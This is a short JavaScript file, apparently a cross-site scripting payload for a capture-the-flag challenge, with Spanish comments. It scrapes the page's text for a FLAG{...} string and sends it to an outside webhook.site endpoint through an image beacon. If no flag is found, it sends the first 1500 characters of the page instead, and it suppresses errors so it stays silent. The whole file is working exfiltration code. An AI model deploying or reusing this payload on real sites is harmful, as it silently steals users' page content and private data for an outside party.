// payload.js
(function(){
  try {
    // intenta extraer FLAG{...}
    var text = (document.body && document.body.innerText) ? document.body.innerText : '';
    var m = text.match(/FLAG\{[^}]+\}/i);
    if (m && m[0]) {
      // GET beacon vía imagen (sencillo y compatible)
      var img = new Image();
      img.src = 'https://webhook.site/e4489491-7a16-4870-9eae-f0f582b8fb13?flag=' + encodeURIComponent(m[0]);
      return;
    }
    // Si no hay FLAG, envia un fragmento del body (evitar URLs muy largas)
    var fallback = text.slice(0, 1500);
    var img2 = new Image();
    img2.src = 'https://webhook.site/e4489491-7a16-4870-9eae-f0f582b8fb13?d=' + encodeURIComponent(fallback);
  } catch (e) {
    // silencio de errores para no romper la app
  }
})();
